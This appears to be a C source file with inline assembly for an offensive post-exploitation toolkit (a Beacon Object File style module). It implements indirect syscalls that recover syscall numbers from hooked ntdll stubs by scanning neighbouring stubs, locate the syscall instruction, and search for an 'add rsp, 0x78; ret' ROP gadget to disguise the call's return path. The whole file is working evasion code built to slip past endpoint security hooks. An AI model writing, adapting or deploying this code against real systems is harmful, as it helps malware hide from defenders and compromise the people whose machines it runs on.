#include <windows.h>
#include "gate.h"

/* Include NTSTATUS for return types */
typedef LONG NTSTATUS;

WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR lpModuleName);
WINBASEAPI int WINAPI MSVCRT$memcmp(const void *ptr1, const void *ptr2, size_t num);

#define SYS_STUB_SIZE 32
#define UP -SYS_STUB_SIZE
#define DOWN SYS_STUB_SIZE

static BOOL GetSyscall(PVOID ntdll, PVOID func, SYSCALL_GATE * gate) {
    PIMAGE_DOS_HEADER pDosHdr          = NULL;
    PIMAGE_NT_HEADERS pNtHdrs          = NULL;
    PIMAGE_EXPORT_DIRECTORY pExportDir = NULL;

    DWORD dwSyscallNr = 0;
    PVOID pIndirect   = NULL;

    PDWORD pdwAddrOfFunctions  = NULL;
    PWORD pwAddrOfNameOrdinals = NULL;
    
    WORD wIdxStub  = 0;
    WORD wIdxfName = 0;
    BOOL bHooked   = FALSE;

    pDosHdr    = (PIMAGE_DOS_HEADER)ntdll;
    pNtHdrs    = (PIMAGE_NT_HEADERS)((PBYTE)ntdll + pDosHdr->e_lfanew);
    pExportDir = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)ntdll + pNtHdrs->OptionalHeader.DataDirectory[0].VirtualAddress);

    pdwAddrOfFunctions   = (PDWORD)((PBYTE)ntdll + pExportDir->AddressOfFunctions);
    pwAddrOfNameOrdinals = (PWORD)((PBYTE)ntdll + pExportDir->AddressOfNameOrdinals);

    for (wIdxStub = 0; wIdxStub < SYS_STUB_SIZE; wIdxStub++)
    {
        if (*((PBYTE)func + wIdxStub) == 0xe9) {
            bHooked = TRUE;
            break;
        }

        if (*((PBYTE)func + wIdxStub) == 0xc3)
            return FALSE;

        if (*((PBYTE)func + wIdxStub) == 0x4c &&
            *((PBYTE)func + wIdxStub + 1) == 0x8b &&
            *((PBYTE)func + wIdxStub + 2) == 0xd1 &&
            *((PBYTE)func + wIdxStub + 3) == 0xb8 &&
            *((PBYTE)func + wIdxStub + 6) == 0x00 &&
            *((PBYTE)func + wIdxStub + 7) == 0x00) {

                BYTE low  = *((PBYTE)func + 4 + wIdxStub);
                BYTE high = *((PBYTE)func + 5 + wIdxStub);

                dwSyscallNr = (high << 8) | low;

                break;
        }
    }

    if (bHooked)
    {
        for (wIdxfName = 1; wIdxfName <= pExportDir->NumberOfFunctions; wIdxfName++) {
            if ((PBYTE)func + wIdxfName * DOWN < ((PBYTE)ntdll + pdwAddrOfFunctions[pwAddrOfNameOrdinals[pExportDir->NumberOfFunctions - 1]])) {
                if (*((PBYTE)func + wIdxfName * DOWN) == 0x4c &&
                    *((PBYTE)func + 1 + wIdxfName * DOWN) == 0x8b &&
                    *((PBYTE)func + 2 + wIdxfName * DOWN) == 0xd1 &&
                    *((PBYTE)func + 3 + wIdxfName * DOWN) == 0xb8 &&
                    *((PBYTE)func + 6 + wIdxfName * DOWN) == 0x00 &&
                    *((PBYTE)func + 7 + wIdxfName * DOWN) == 0x00) {

                        BYTE high = *((PBYTE)func + 5 + wIdxfName * DOWN);
                        BYTE low  = *((PBYTE)func + 4 + wIdxfName * DOWN);
                        
                        dwSyscallNr = (high << 8) | (low - wIdxfName);
                        func        = (PVOID)((PBYTE)func + wIdxfName * DOWN);

                        break;
                }
            }

            if ((PBYTE)func + wIdxfName * UP > ((PBYTE)ntdll + pdwAddrOfFunctions[pwAddrOfNameOrdinals[0]])) {

                if (*((PBYTE)func + wIdxfName * UP) == 0x4c &&
                    *((PBYTE)func + 1 + wIdxfName * UP) == 0x8b &&
                    *((PBYTE)func + 2 + wIdxfName * UP) == 0xd1 &&
                    *((PBYTE)func + 3 + wIdxfName * UP) == 0xb8 &&
                    *((PBYTE)func + 6 + wIdxfName * UP) == 0x00 &&
                    *((PBYTE)func + 7 + wIdxfName * UP) == 0x00) {

                        BYTE high = *((PBYTE)func + 5 + wIdxfName * UP);
                        BYTE low  = *((PBYTE)func + 4 + wIdxfName * UP);
                        
                        dwSyscallNr = (high << 8) | (low + wIdxfName);
                        func        = (PVOID)((PBYTE)func + wIdxfName * UP);

                        break;
                }
            }
        }
    }

    if (func && dwSyscallNr)
    {
        for (wIdxStub = 0; wIdxStub < SYS_STUB_SIZE; wIdxStub++)
        {
            if (*((PBYTE)func + wIdxStub) == 0x0f &&
                *((PBYTE)func + wIdxStub + 1) == 0x05 &&
                *((PBYTE)func + wIdxStub + 2) == 0xc3) {
                    pIndirect = (LPVOID)((PBYTE)func + wIdxStub);
                    break;
            }
        }
    }

    /* set values */
    gate->ssn = dwSyscallNr;
    gate->syscallAddr = pIndirect;
    gate->args = NULL;          /* Will be set by PrepareNtSyscall functions */
    gate->argCount = 0;         /* Will be set by PrepareNtSyscall functions */
    gate->returnGadget = NULL;  /* Will be set by PrepareNtSyscallEx if needed */

    return TRUE;
}

/**
 * Search for ROP gadget in .text section
 *
 * This function searches for the specific pattern 0x00C378C48348 - "add rsp, 0x78; ret"
 *
 * @return Pointer to the gadget location, or NULL if not found
 */
PVOID Search_For_Add_Rsp_Ret() {
    HANDLE moduleBase = KERNEL32$GetModuleHandleA("ntdll");
    if (!moduleBase) return NULL;

    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)moduleBase;
    if (pDosHdr->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    
    PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)moduleBase + pDosHdr->e_lfanew);
    if (pNtHdrs->Signature != IMAGE_NT_SIGNATURE) return NULL;
    
    PIMAGE_SECTION_HEADER pSectionHdr = (PIMAGE_SECTION_HEADER)(pNtHdrs + 1);
    
    /* Find .text section */
    for (WORD i = 0; i < pNtHdrs->FileHeader.NumberOfSections; i++) {
        if (*(DWORD*)pSectionHdr[i].Name == 0x7865742E) { /* ".tex" in little endian */
            PBYTE textStart = (PBYTE)moduleBase + pSectionHdr[i].VirtualAddress;
            DWORD textSize = pSectionHdr[i].Misc.VirtualSize;
            
            /* Search for pattern "add rsp, 0x78; ret" (48 83 C4 78 C3) within .text section */
            BYTE targetPattern[5] = {0x48, 0x83, 0xC4, 0x78, 0xC3};
            
            for (DWORD j = 0; j < textSize - 5; j++) {
                if (MSVCRT$memcmp(textStart + j, targetPattern, 5) == 0) {
                    return textStart + j;
                }
            }
            break;
        }
    }
    
    return NULL; /* Pattern not found in .text section */
}

/**
 * Prepare syscall with optional ROP gadget
 * 
 * @param functionName Name of NT function (e.g., "NtAllocateVirtualMemory")  
 * @param arguments Array of function arguments
 * @param argCount Number of arguments
 * @param enableRopGadget TRUE = JUMP mode with ROP gadget, FALSE = CALL mode
 * @return Complete SYSCALL_GATE ready for ExecuteSyscall()
 */
SYSCALL_GATE PrepareSyscall(LPCSTR functionName, PVOID *arguments, DWORD argCount, BOOL enableRopGadget)
{
    SYSCALL_GATE gate = {0};
    HANDLE hNtdll;
    HANDLE hFunction;
    
    /* Resolve NTDLL module */
    hNtdll = KERNEL32$GetModuleHandleA("ntdll");
    if (!hNtdll) {
        return gate; /* Return empty gate on failure */
    }
    
    /* Resolve target function */
    hFunction = GetProcAddress(hNtdll, functionName);
    if (!hFunction) {
        return gate; /* Return empty gate on failure */
    }
    
    /* Extract syscall information using private GetSyscall */
    if (!GetSyscall(hNtdll, hFunction, &gate)) {
        gate.ssn = 0; /* Mark as invalid */
        return gate;
    }
    
    /* Setup execution parameters */
    gate.args = arguments;
    gate.argCount = argCount;
    
    /* Set return gadget based on enableRopGadget flag */
    if (enableRopGadget) {
        gate.returnGadget = Search_For_Add_Rsp_Ret();
        if (!gate.returnGadget) {
            /* If no ROP gadget found, fall back to CALL mode */
            gate.returnGadget = NULL;
        }
    } else {
        gate.returnGadget = NULL; /* CALL mode */
    }
    
    return gate;
}

/**
 * Universal syscall executor using prepared SYSCALL_GATE
 * 
 * Execution mode is determined by returnGadget field:
 * - NULL: CALL mode (stable, returns normally)
 * - Non-NULL: JUMP mode (uses ROP gadget, never returns to this function)
 * 
 * @param gate Pointer to prepared SYSCALL_GATE structure
 * @return NTSTATUS code from the syscall execution
 */
NTSTATUS __attribute__((naked)) ExecuteSyscall(PSYSCALL_GATE gate)
{
    __asm__ __volatile__ (
        ".intel_syntax noprefix;"
        
        /* ===== STACK SETUP AND PRESERVATION ===== */
        "sub rsp, 0x78;"               /* Reserve stack space for arguments */
        "mov r12, rcx;"                /* R12 = gate pointer (preserve) */
        
        /* ===== EXTRACT PARAMETERS FROM SYSCALL_GATE ===== */
        "mov rsi, [rcx + 0x10];"       /* RSI = gate->args (argument array pointer) */
        "mov eax, [rcx + 0x18];"       /* EAX = gate->argCount */
        "mov r14, rax;"                /* R14 = argCount (working copy) */
        "mov r15, [rcx + 0x8];"        /* R15 = gate->syscallAddr */
        "mov r10, [rcx + 0x20];"       /* R10 = gate->returnGadget */
        
        /* ===== MODE DETERMINATION ===== */
        "test r10, r10;"               /* Check if returnGadget == NULL */
        "jz call_mode_setup;"          /* If NULL, use CALL mode */
        
        /* JUMP mode setup */
        "mov [rsp], r10;"              /* Store returnGadget for push later */
        "jmp load_arguments;"
        
        "call_mode_setup:"
            /* CALL mode setup */
            "mov [rsp], r15;"          /* Store syscallAddr for call later */
            
        /* ===== ARGUMENT LOADING (Windows x64 Fast Call Convention) ===== */
        "load_arguments:"
            /* Check if we have any arguments */
            "test r14, r14;"
            "jz execute_syscall;"       /* No arguments, jump to execution */
            
            /* Load first argument (RCX) */
            "mov rcx, [rsi];"
            "dec r14;"
            "jz execute_syscall;"
            
            /* Load second argument (RDX) */
            "add rsi, 0x8;"
            "mov rdx, [rsi];"
            "dec r14;"
            "jz execute_syscall;"
            
            /* Load third argument (R8) */
            "add rsi, 0x8;"
            "mov r8, [rsi];"
            "dec r14;"
            "jz execute_syscall;"
            
            /* Load fourth argument (R9) */
            "add rsi, 0x8;"
            "mov r9, [rsi];"
            "dec r14;"
            "jz execute_syscall;"
            
            /* Load remaining arguments onto stack (5+ parameters) */
            "mov r11, rsp;"            /* R11 = stack pointer */
            "add r11, 0x20;"           /* Skip shadow space */
            
        "stack_args_loop:"
            "add rsi, 0x8;"            /* Next argument */
            "mov r13, [rsi];"          /* Load argument */
            "add r11, 0x8;"            /* Next stack position */
            "mov [r11], r13;"          /* Store on stack */
            "dec r14;"
            "jnz stack_args_loop;"     /* Continue if more args */
            
        /* ===== SYSCALL EXECUTION ===== */
        "execute_syscall:"
            "mov r10, rcx;"            /* R10 = first arg (syscall convention) */
            "mov eax, [r12];"          /* EAX = gate->ssn (CRITICAL: Load SSN!) */
            
            /* Check execution mode by testing returnGadget again */
            "mov r11, [r12 + 0x20];"   /* R11 = gate->returnGadget */
            "test r11, r11;"
            "jz do_call_mode;"         /* NULL = CALL mode */
            
        /* JUMP mode execution */
        "do_jump_mode:"
            "push r11;"                /* Push return gadget onto stack */
            "jmp r15;"                 /* Jump to syscall (never returns here) */
            
        /* CALL mode execution */
        "do_call_mode:"
            "call [rsp];"              /* Call syscall address */
            "add rsp, 0x78;"           /* Clean up stack */
            "ret;"                     /* Return with RAX containing NTSTATUS */
            
        ".att_syntax prefix"
    );
}